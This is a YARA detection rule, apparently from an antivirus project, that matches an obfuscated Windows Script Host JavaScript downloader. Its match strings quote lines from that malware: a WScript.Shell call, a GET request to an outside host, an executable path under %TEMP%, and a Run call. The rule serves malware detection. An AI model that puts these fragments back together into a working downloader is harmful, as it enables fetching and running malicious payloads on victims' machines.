rule sig_20160330_e0ce5b6d70a410272da749763ad6bf4f {
  meta:
    description = "datamaliciousorder - file 20160330_e0ce5b6d70a410272da749763ad6bf4f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6c6f871f05c748082b1cb7d25238226a7768348e0e1dcebbcd89ea6635f2e22d"

  strings:
    $s1  = "var _FL = function _R() {return WScript[_Q](\"WScript\"+\".Shell\");}(), _A = 11;" fullword ascii
    $s2  = "function _R0(_HO, _X0){_DD = _DD * 1; return _HO - _X0;};" fullword ascii
    $s3  = "_L[_G0](\"GET\", \"http://ru-optovik.ru/j9ssl\", false);" fullword ascii
    $s4  = "if (_L[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _YM() {return _FL[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"6F3bjYsuX.ex\" + \"e\";};" fullword ascii
    $s6  = "function _S(){return _E0 + \"\";};" fullword ascii
    $s7  = "function _G(_R2){_FL[\"Run\"](_R2, _DD, _DD);};" fullword ascii
    $s8  = "function _HB() {return ((_NT == true) && (_NT == _D)) ? 1 : _DD;};" fullword ascii
    $s9  = "var _UW = new this[\"Date\"]();" fullword ascii
    $s10 = "function _U(){return 22;};" fullword ascii
    $s11 = "return _R0(_ET, _E1);" fullword ascii
    $s12 = " while (_Y0){" fullword ascii
    $s13 = "function _E(){return _Q;};" fullword ascii
    $s14 = "function _IC()" fullword ascii
    $s15 = "function _Y(_WV) {var _X = (1, 2, 3, 4, 5, _WV); return _X;};" fullword ascii
    $s16 = "var _D = false;" fullword ascii
    $s17 = "_NT = true; " fullword ascii
    $s18 = "var _NT = false;" fullword ascii
    $s19 = "_D = true; " fullword ascii
    $s20 = "var _ZP = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}